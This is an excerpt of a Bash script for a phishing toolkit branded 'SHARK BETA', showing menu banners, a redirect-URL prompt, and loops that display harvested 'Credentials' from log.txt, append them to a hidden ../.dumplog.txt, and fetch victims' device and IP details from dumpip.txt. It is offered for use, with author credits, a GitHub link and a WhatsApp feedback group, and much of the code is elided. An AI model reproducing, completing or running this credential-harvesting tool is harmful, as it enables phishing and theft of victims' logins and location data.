...
ctrl-c_exit_SIGINT() {
    ...
    echo "$KL" >> ../.dumplog.txt &>/dev/null
    cat log.txt >> ../.dumplog.txt &>/dev/null
    exit 0
}
...
function main_update() {
	...
	echo
	msg "we will soon provide you this service!\n"
	sleep 2
	msg "Just clone shark and run setup"
	echo
	exit 0
}
...
For additional info, see: https://github.com/Bhaviktutorials/shark/tree/Beta
EOF
}
...
if [[ $ansm == "N" || $ansm == "n" ]]; then
	echo
	msg "Your Url is set as default.[google.com]"
...
function redrk() {
	echo
        read -p $'\e[1;34m enter your redirect url ex.[https://google.com] : \e[0m' relink
        url_checker $relink
	rm -rf drk/ 
	mkdir drk 
        cp -R * drk &>/dev/null
...
clear
printf "${green}        ╔──────────────────────────────────────╗\n"
printf "${green}        |   ${cyan1}     S.H.A.R.K !! B.E.T.A ${green}         |
        |   ${yellow}      Choose your Option ${green}          |\n"
printf "${green}        ╚──────────────────────────────────────╝${cyan1}.beta v$VERSION \n\n"
...
while [ true ]; do
	if [[ -e log.txt ]]; then
		#CRD=$(cat log.txt)
		echo -e "\e[1;92m[\e[0m\e[1;34m•\e[0m\e[1;92m] Credentials: "
		tail -f log.txt & cat log.txt >> ../.dumplog.txt & while [ true ]; do
...
function ipinfo() {
	echo
	if [[ -f ../.dumplog.txt ]]; then
		CRD1=$(cat ../.dumplog.txt)
		msg "Your Old Credentials :\n$CRD1\n"
	fi
        printf "${yellow}[•]  F E T C H I N G   D E V I C E.....\n\n"
while [ true ]; do
if [[ -e dumpip.txt ]]; then
	echo
	printf "${green}[✔] D E V I C E   I N F O   F O U N D\n\n"
	sleep 2
	ipcatch
	break;
fi
...
banner2() {
	printf "\n${green}
        ...
        ║${white}   ╚═╝┴└─└─┘─┴┘└─┘┘└┘ ┴ ┴┴ ┴┴─┘└─┘${green}  ║
        ╚════════════════════════════════════╝
	SEHRISH : ${white}v${VERSION}${green}
         Reborn by : ${white}Mr.Derek(t2g)${green}
         Publisher : ${white}Bhavik Oza${green}
	    Author : ${white}Ashish Singh${green}
	     Note  : ${yellow}Soon will add New Features!${yellow}
...
msg "Give us your feedback on :- https://chat.whatsapp.com/DY8itwxRnuf64yqxoWZ0SQn\n"
